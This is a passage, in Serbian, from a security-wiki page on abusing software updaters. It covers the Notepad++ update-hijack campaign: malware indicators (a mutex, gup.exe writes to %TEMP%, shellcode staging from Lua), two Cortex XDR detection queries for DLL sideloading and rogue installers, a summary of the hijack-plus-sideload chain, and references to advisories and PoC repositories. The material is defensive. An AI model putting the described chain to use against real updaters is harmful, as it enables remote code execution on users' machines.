- Pratite **artefakte specifične za malware** zabeležene u ovom lancu (korisne kao opšte tačke provere): mutex `Global\Jdhfv_1.0.1`, neuobičajena upisivanja programa `gup.exe` u `%TEMP%` i faze ubacivanja shellcode-a pokrenute iz Lua skripti.
- Notepad++ je odgovorio jačanjem WinGUp-a u verziji v8.8.9 i novijim: vraćeni XML je sada potpisan (XMLDSig), a novije verzije zahtevaju proveru sertifikata i potpisa preuzetog instalatora umesto da se oslanjaju samo na transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideload potpisanog Bitdefender EXE-a `log.dll` (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> pokreće instalacioni program koji nije za Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ovi obrasci se mogu primeniti na svaki updater koji prihvata nepotpisane manifeste ili ne proverava potpisnike instalacionih programa — otmica mrežnog saobraćaja + zlonamerni instalacioni program + sideloading uz BYO-signed potpis omogućavaju daljinsko izvršavanje koda pod maskom „pouzdanih“ ažuriranja.

---
## References
- [1] [Savet – Netskope Client za Windows – lokalna eskalacija privilegija preko lažnog servera (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Bezbednosno obaveštenje kompanije Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope dodatak](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC klijent/eksploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre i Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – lokalna eskalacija privilegija preko upisivih datoteka u Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – eskalacija privilegija u Windows agentu](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC-ovi](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – akteri koje podržavaju države iskorišćavaju lanac snabdevanja Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – ažuriranje o incidentu sa otetom infrastrukturom](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – zaobilaženje ispravke za CVE-2025-0309 u Netskope Client za Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – otkrivanje grešaka koje omogućavaju eskalaciju privilegija u Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
